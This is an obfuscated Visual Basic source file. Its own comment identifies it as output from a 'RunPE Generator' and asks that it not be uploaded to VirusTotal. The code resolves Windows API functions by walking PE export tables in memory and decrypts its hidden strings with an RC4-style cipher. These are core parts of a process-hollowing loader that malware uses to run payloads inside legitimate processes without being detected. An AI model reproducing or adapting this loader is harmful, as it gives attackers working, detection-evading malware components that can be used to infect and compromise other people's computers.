Public Function W1c2W5YkBQXZiGBegNTm(ByVal F8a4W3ZKRYoQPfVXPoRy As String, ByVal w5U7f4kuddQQrANoInMd As String) As Long
GoTo f8C8S8aKGuPFyKUDDpcE
f8C8S8aKGuPFyKUDDpcE:
    W1c2W5YkBQXZiGBegNTm = Me.G4g4C8wyBmfmRrcsvAqQ(Me.H8s6F0YITYVgwUVeDjNc(F8a4W3ZKRYoQPfVXPoRy), w5U7f4kuddQQrANoInMd)
GoTo P5p4o4fFsqkDAWsRXTeh
P5p4o4fFsqkDAWsRXTeh:
End Function

Public Function H8s6F0YITYVgwUVeDjNc(ByVal F8a4W3ZKRYoQPfVXPoRy As String) As Long
GoTo Z8y1P2nDWpJEsYhiglWP
Z8y1P2nDWpJEsYhiglWP:
    H8s6F0YITYVgwUVeDjNc = T5I5H5vXwJDVEbLVbXjA(U2E6s8ryhahMYYnrumLa, StrPtr(F8a4W3ZKRYoQPfVXPoRy & vbNullChar))
GoTo G6v8M3TLjrbJMgJNblHU
G6v8M3TLjrbJMgJNblHU:
End Function

Public Property Get Initialized() As Boolean
GoTo v6K5f1oGsvWvICURnKia
v6K5f1oGsvWvICURnKia:
    Initialized = r5J2g1NblHUHtVqpSARD
GoTo L5q2A1gbFHnHNVKpAwDa
L5q2A1gbFHnHNVKpAwDa:
End Property

Public Sub Class_Initialize()
GoTo W5I3U6nqiHWPhjEglyer
W5I3U6nqiHWPhjEglyer:
    Call w0Q4y1yiKgeHoGryWyHB(k5N8w3uANKsGffHPcEXD)
GoTo A0b6v4sXyOnOZTlUrblr
A0b6v4sXyOnOZTlUrblr:
    s2I5B4fbmpFablupTiCW = v0P2u1hhJSeGaFdyVyHB
GoTo Q5s1P3awsWYFLembHDDC
Q5s1P3awsWYFLembHDDC:
    If Not s2I5B4fbmpFablupTiCW = 0 Then
GoTo i3a6w4XndgYvaFDkZtkb
i3a6w4XndgYvaFDkZtkb:
        U2E6s8ryhahMYYnrumLa = G4g4C8wyBmfmRrcsvAqQ(s2I5B4fbmpFablupTiCW, c7y0q2(Chr$(50) & Chr$(111) & Chr$(99) & Chr$(102) & Chr$(78) & Chr$(107) & Chr$(96) & Chr$(112) & Chr$(99) & Chr$(112) & Chr$(123) & Chr$(85), Chr$(85) & Chr$(55) & Chr$(90) & Chr$(48) & Chr$(83) & Chr$(48) & Chr$(70) & Chr$(89) & Chr$(103) & Chr$(87)))
GoTo X6R3E0fnAcybARdRPJbY
X6R3E0fnAcybARdRPJbY:
        If Not U2E6s8ryhahMYYnrumLa = 0 Then
GoTo X1S4U5vwTUdCiMbIOhpf
X1S4U5vwTUdCiMbIOhpf:
            r5J2g1NblHUHtVqpSARD = True
GoTo B8y8A6dkPpbruwpOrWGC
B8y8A6dkPpbruwpOrWGC:
        End If
GoTo M5W2b6UUHtUqESARDHgV
M5W2b6UUHtUqESARDHgV:
    End If
GoTo u7H0a8VbXilBWXhqlPfw
u7H0a8VbXilBWXhqlPfw:
End Sub

Public Function G4g4C8wyBmfmRrcsvAqQ(ByVal l7s6J4RBikGimBvftTTt As Long, ByVal w5U7f4kuddQQrANoInMd As String) As Long
GoTo H4V2p0AwDngnSfeuBsSh
H4V2p0AwDngnSfeuBsSh:
    Dim ti7U5g8ADuTibLsyQsvLI       As i7U5g8ADuTibLsyQsvLI
GoTo C6U4q3YlvReSEfCBcKbN
C6U4q3YlvReSEfCBcKbN:
    Dim tZ6S3F1goCdwcBSeTQKcZ       As Z6S3F1goCdwcBSeTQKcZ
GoTo B4B2G4VrOmeamDSnbkID
B4B2G4VrOmeamDSnbkID:
    Dim tU1P3R5tuQSbfJZGMfncI As U1P3R5tuQSbfJZGMfncI
GoTo W4E4e6bHQRPUrwFjvyMQ
W4E4e6bHQRPUrwFjvyMQ:
    Call I0p0O8yjWvTftbsfjJvu(ti7U5g8ADuTibLsyQsvLI, ByVal l7s6J4RBikGimBvftTTt, A4t0y1LZuvGQLoEWqKEt)
GoTo u6L4T0knIkoDiyVVvFRt
u6L4T0knIkoDiyVVvFRt:
    If Not ti7U5g8ADuTibLsyQsvLI.e_magic = h7Y3Y0dPeildCeKtpeof Then
GoTo D6G4w4jdyeClyCwKapvI
D6G4w4jdyeClyCwKapvI:
        Exit Function
GoTo B8Z4H2hoeKFGEJuBIZAP
B8Z4H2hoeKFGEJuBIZAP:
    End If
GoTo h6b0d1HodwnesDllYYAI
h6b0d1HodwnesDllYYAI:
    Call I0p0O8yjWvTftbsfjJvu(tZ6S3F1goCdwcBSeTQKcZ, ByVal l7s6J4RBikGimBvftTTt + ti7U5g8ADuTibLsyQsvLI.e_lfanew, w1H1L8oyanmDGJBZohRA)
GoTo p3l3p1THFROkUflhsKLg
p3l3p1THFROkUflhsKLg:
    If Not tZ6S3F1goCdwcBSeTQKcZ.Signature = L3E0q5EanCiAmqQECyOL Then
GoTo X5E6P5LRksiOJJINwqwc
X5E6P5LRksiOJJINwqwc:
        Exit Function
GoTo f3h6n5EhMyrgBqhyGoob
f3h6n5EhMyrgBqhyGoob:
    End If
GoTo E5B2c1bNRqecWolIeDJF
E5B2c1bNRqecWolIeDJF:
    Dim B1e3Q1cZySqvsEHWrsDM   As Long
GoTo A0R7o8IDfyOiCylRaaZe
A0R7o8IDfyOiCylRaaZe:
    Dim R8L5w3LBgpposeXeJVVl      As Long
GoTo r6r4i6CFvVkdNuwSuNXs
r6r4i6CFvVkdNuwSuNXs:
    Dim s8n2b3EloJlpEOjvjWwU       As Long
GoTo y6V8S3taseiIitnGDZyU
y6V8S3taseiIitnGDZyU:
    With tZ6S3F1goCdwcBSeTQKcZ.OptionalHeader
GoTo o6v2c8luSNqsZtHycklj
o6v2c8luSNqsZtHycklj:
        B1e3Q1cZySqvsEHWrsDM = l7s6J4RBikGimBvftTTt + .DataDirectory(0).Virtuat8J0C8SyaYGuPFyKUDDp
GoTo K6n8Z6lCGIAZogRBVwDR
K6n8Z6lCGIAZogRBVwDR:
        R8L5w3LBgpposeXeJVVl = B1e3Q1cZySqvsEHWrsDM + .DataDirectory(0).Size
GoTo D6Y4A1VvQyUlMlwrJsPK
D6Y4A1VvQyUlMlwrJsPK:
        s8n2b3EloJlpEOjvjWwU = .ImageBase
GoTo e2W5t3UkadUtWChVqgXl
e2W5t3UkadUtWChVqgXl:
    End With
GoTo e2N0B5kvYsXyOZOLFXUr
e2N0B5kvYsXyOZOLFXUr:
    Call I0p0O8yjWvTftbsfjJvu(tU1P3R5tuQSbfJZGMfncI, ByVal B1e3Q1cZySqvsEHWrsDM, g0d6y1bocOpMLmUlXcCc)
GoTo D2T2b7sOQZveIXEKdlbH
D2T2b7sOQZveIXEKdlbH:
    Dim e7A5y4RdROIaYueouqDU4           As Long
GoTo e5d6T2TwYKadgYvaFokZ
e5d6T2TwYKadgYvaFokZ:
    Dim n5k1D5iPjovmSbbZeCJQ   As Long
GoTo P1y1U0DpcDZmBhAlpPEB
P1y1U0DpcDZmBhAlpPEB:
    Dim L2a5h4wNGpXauXbplViI    As Long
GoTo k0A4r3WTehvSTcmhLatN
k0A4r3WTehvSTcmhLatN:
    Dim L6u1j0iHYYjdyfClvDKb    As Long
GoTo J0s4h6glWPWBONdhjbBQ
J0s4h6glWPWBONdhjbBQ:
    With tU1P3R5tuQSbfJZGMfncI
GoTo r5J2g1NblGUHtUqpSRDH
r5J2g1NblGUHtUqpSRDH:
        For e7A5y4RdROIaYueouqDU4 = 0 To .NumberOfNames - 1
GoTo I6t7G0ZyUMIUlAVJSpkO
I6t7G0ZyUMIUlAVJSpkO:
            I0p0O8yjWvTftbsfjJvu L2a5h4wNGpXauXbplViI, ByVal s8n2b3EloJlpEOjvjWwU + .lpAddressOfNames + e7A5y4RdROIaYueouqDU4 * 4, 4
GoTo s4t0H8clljoMTaFRRgkn
s4t0H8clljoMTaFRRgkn:
            If c0Z6B6lpPDBuNKgDbhdo(s8n2b3EloJlpEOjvjWwU + L2a5h4wNGpXauXbplViI) = w5U7f4kuddQQrANoInMd Then
GoTo F5s6W0GaDIVSBOnnPXkM
F5s6W0GaDIVSBOnnPXkM:
                I0p0O8yjWvTftbsfjJvu L6u1j0iHYYjdyfClvDKb, ByVal s8n2b3EloJlpEOjvjWwU + .lpAddressOfNameOrdinals + e7A5y4RdROIaYueouqDU4 * 2, 2
GoTo V0Y7Q7CyOwUEPURctIQR
V0Y7Q7CyOwUEPURctIQR:
                I0p0O8yjWvTftbsfjJvu n5k1D5iPjovmSbbZeCJQ, ByVal s8n2b3EloJlpEOjvjWwU + .lpAddressOfFunctions + L6u1j0iHYYjdyfClvDKb * 4, 4
GoTo p2I6n3atCqWSSQVHNUlM
p2I6n3atCqWSSQVHNUlM:
                G4g4C8wyBmfmRrcsvAqQ = n5k1D5iPjovmSbbZeCJQ + s8n2b3EloJlpEOjvjWwU
GoTo t2A0u3vbZHyQHwLVEErr
t2A0u3vbZHyQHwLVEErr:
                If G4g4C8wyBmfmRrcsvAqQ >= B1e3Q1cZySqvsEHWrsDM And _
                   G4g4C8wyBmfmRrcsvAqQ <= R8L5w3LBgpposeXeJVVl Then
GoTo v6G1Q7VOuBUcSwstrvha
v6G1Q7VOuBUcSwstrvha:
                    Call B1K3q6PRwEXfUAyyukqP(G4g4C8wyBmfmRrcsvAqQ, l7s6J4RBikGimBvftTTt, w5U7f4kuddQQrANoInMd)
GoTo K7P0R3XPoRygbQkbSfpZ
K7P0R3XPoRygbQkbSfpZ:
                    If Not l7s6J4RBikGimBvftTTt = 0 Then
GoTo H8g1e7FmEpuUIGASPlIg
H8g1e7FmEpuUIGASPlIg:
                        G4g4C8wyBmfmRrcsvAqQ = G4g4C8wyBmfmRrcsvAqQ(l7s6J4RBikGimBvftTTt, w5U7f4kuddQQrANoInMd)
GoTo b4j6B4YhrmQfwSlfVBKK
b4j6B4YhrmQfwSlfVBKK:
                    Else
GoTo X5N1O7FEUYaSrHjRToRV
X5N1O7FEUYaSrHjRToRV:
                        G4g4C8wyBmfmRrcsvAqQ = 0
GoTo S5w2w6MhgJqItwXwJDVS
S5w2w6MhgJqItwXwJDVS:
                    End If
GoTo e0Z3N4pFaOXupTVCVbjY
e0Z3N4pFaOXupTVCVbjY:
                End If
GoTo T5c4f0KRyIIYbeWuKDmU
T5c4f0KRyIIYbeWuKDmU:
                Exit Function
GoTo G4D1V3BOnnPYkMgLjCbC
G4D1V3BOnnPYkMgLjCbC:
            End If
GoTo C8O8U1PVRctIQRbtXYFM
C8O8U1PVRctIQRbtXYFM:
        Next
GoTo H2F6f5ejUbiaZpfhZbGE
H2F6f5ejUbiaZpfhZbGE:
    End With
GoTo H8Q1w2VFErrTbnQjPmFR
H8Q1w2VFErrTbnQjPmFR:
End Function

Private Function B1K3q6PRwEXfUAyyukqP(ByVal t8J0C8SyaYGuPFyKUDDp As Long, ByRef H6q0f0eDUgVSMebwhsuG As Long, ByRef O2k6u3AdsZfHvcXYWbMF As String)
GoTo u7l1B4ISYUgvwTVeCjMc
u7l1B4ISYUgvwTVeCjMc:
    Dim d1i3k7qiHkPujEulJrrf     As String
GoTo l7L3I7jjimYRYDdPfild
l7L3I7jjimYRYDdPfild:
    d1i3k7qiHkPujEulJrrf = c0Z6B6lpPDBuNKgDbhdo(t8J0C8SyaYGuPFyKUDDp)
GoTo r3j5T7eVjtccPCcMaHZL
r3j5T7eVjtccPCcMaHZL:
    If InStr(1, d1i3k7qiHkPujEulJrrf, c7y0q2(Chr$(248), Chr$(67) & Chr$(56) & Chr$(118) & Chr$(56) & Chr$(66) & Chr$(54) & Chr$(101) & Chr$(108) & Chr$(81) & Chr$(113))) Then
GoTo j1w8p1FbvVbXjmCXYhrm
j1w8p1FbvVbXjmCXYhrm:
        H6q0f0eDUgVSMebwhsuG = H8s6F0YITYVgwUVeDjNc(Split(d1i3k7qiHkPujEulJrrf, c7y0q2(Chr$(248), Chr$(67) & Chr$(56) & Chr$(118) & Chr$(56) & Chr$(66) & Chr$(54) & Chr$(101) & Chr$(108) & Chr$(81) & Chr$(113)))(0))
GoTo s1a8O1wdmnlqbUbGTSil
s1a8O1wdmnlqbUbGTSil:
        O2k6u3AdsZfHvcXYWbMF = Split(d1i3k7qiHkPujEulJrrf, c7y0q2(Chr$(248), Chr$(67) & Chr$(56) & Chr$(118) & Chr$(56) & Chr$(66) & Chr$(54) & Chr$(101) & Chr$(108) & Chr$(81) & Chr$(113)))(1)
GoTo e4u2D6UXrUYmvSfSFgDB
e4u2D6UXrUYmvSfSFgDB:
    End If
GoTo M8L8B4BNHYWsOmfbmESo
M8L8B4BNHYWsOmfbmESo:
End Function

Private Function c0Z6B6lpPDBuNKgDbhdo(ByVal t8J0C8SyaYGuPFyKUDDp As Long) As String
GoTo q0X3y8eEMBhpqotRYfJW
q0X3y8eEMBhpqotRYfJW:
    Dim i8S3d7iMbtOhbRvGGFKu       As Byte
GoTo L5e6Z0NGqYauXcpmViII
L5e6Z0NGqYauXcpmViII:
    Do
GoTo S4n2i2mEeEPJbLhRciep
S4n2i2mEeEPJbLhRciep:
        I0p0O8yjWvTftbsfjJvu i8S3d7iMbtOhbRvGGFKu, ByVal t8J0C8SyaYGuPFyKUDDp, 1
GoTo V6r8D4VBhnHPEkffejUb
V6r8D4VBhnHPEkffejUb:
        t8J0C8SyaYGuPFyKUDDp = t8J0C8SyaYGuPFyKUDDp + 1
GoTo X7P2e3XOnQytbQkaRfpY
X7P2e3XOnQytbQkaRfpY:
        If i8S3d7iMbtOhbRvGGFKu = 0 Then Exit Do
GoTo H8u4e7TmRpIUIFROlVfl
H8u4e7TmRpIUIFROlVfl:
        c0Z6B6lpPDBuNKgDbhdo = c0Z6B6lpPDBuNKgDbhdo & Chr$(i8S3d7iMbtOhbRvGGFKu)
GoTo v1Z4y8GeLoEkqKSInijh
v1Z4y8GeLoEkqKSInijh:
    Loop
GoTo c2G2r3EUXaSqUieTneVi
c2G2r3EUXaSqUieTneVi:
End Function

Public Function c7y0q2(ByVal s4H0r2 As String, ByVal D8H3B0 As String) As String
GoTo O8v6W8TguctfjJwuoHEa
O8v6W8TguctfjJwuoHEa:
    On Error Resume Next
GoTo Z8E0L2dAKTOrIauOIwdm
Z8E0L2dAKTOrIauOIwdm:
    Dim n4B4j8(0 To 255) As Integer, f8i7N0, s2I5A4 As Long, e4m7F4() As Byte
GoTo c4f3J3uIHXbdVuKCmUWq
c4f3J3uIHXbdVuKCmUWq:
    e4m7F4() = StrConv(D8H3B0, vbFromUnicode)
GoTo o8H3m0nZBXWwfvimNmsK
o8H3m0nZBXWwfvimNmsK:
    For f8i7N0 = 0 To 255
GoTo j1c0t7BSgCpAXSyvdwDL
j1c0t7BSgCpAXSyvdwDL:
    s2I5A4 = (s2I5A4 + n4B4j8(f8i7N0) + e4m7F4(f8i7N0 Mod Len(D8H3B0))) Mod 256
GoTo q4f5d6GNULLaehZwNGpX
q4f5d6GNULLaehZwNGpX:
    n4B4j8(f8i7N0) = f8i7N0
GoTo y3s8L1qEddENZCVBYqQq
y3s8L1qEddENZCVBYqQq:
    Next f8i7N0
GoTo e4q4v5qvsFVkrtDaVBhn
e4q4v5qvsFVkrtDaVBhn:
    e4m7F4() = StrConv(s4H0r2, vbFromUnicode)
GoTo c6Z1B0AFpyEUutKADuTv
c6Z1B0AFpyEUutKADuTv:
For f8i7N0 = 0 To Len(s4H0r2)
GoTo t1t7l0BXHSYUfvwTUeCi
t1t7l0BXHSYUfvwTUeCi:
    s2I5A4 = (s2I5A4 + n4B4j8(s2I5A4) + 1) Mod 256
    e4m7F4(f8i7N0) = e4m7F4(f8i7N0) Xor n4B4j8(n4B4j8((s2I5A4 + n4B4j8(s2I5A4)) Mod 254))
    Next f8i7N0
    c7y0q2 = StrConv(e4m7F4, vbUnicode)
End Function

Private Sub w0Q4y1yiKgeHoGryWyHB(ByVal k6E4q7QeAnvUPsubyBJe As String)
GoTo o3w2B1fGRLdavSrjfqIX
o3w2B1fGRLdavSrjfqIX:
    Dim e7A5y4RdROIaYueouqDU3   As Long
GoTo h3e0v4cJdiqgMVVUZyDK
h3e0v4cJdiqgMVVUZyDK:
    For e7A5y4RdROIaYueouqDU3 = 0 To Len(k6E4q7QeAnvUPsubyBJe) - 1 Step 2
GoTo R5d8v0rQfYIpsNptIFnB
R5d8v0rQfYIpsNptIFnB:
        U8J0l3VqTXlhQeDEenAc((e7A5y4RdROIaYueouqDU3 / 2)) = CByte(c7y0q2(Chr$(168) & Chr$(72), Chr$(79) & Chr$(56) & Chr$(73) & Chr$(50) & Chr$(75) & Chr$(52) & Chr$(109) & Chr$(110) & Chr$(74) & Chr$(76)) & Mid$(k6E4q7QeAnvUPsubyBJe, e7A5y4RdROIaYueouqDU3 + 1, 2))
GoTo J1k8G6BgFWvXicudAjuB
J1k8G6BgFWvXicudAjuB:
    Next
GoTo m8P5l6yUOrtagAIwdYZX
m8P5l6yUOrtagAIwdYZX:
End Sub
'-----------------------------------------------------------------------------------
' Function to Call RunPE is : P6C3Q1ktuswibiNaZpty
' This RunPE was created by RunPE Generator v1.1 at 24.03.2010 - 15:34:48
' Please don't upload this code to VirusTotal or another site like that bullshit...
' Thanks to all great members of Hackhoung.org & HackSecu.com!
'-----------------------------------------------------------------------------------


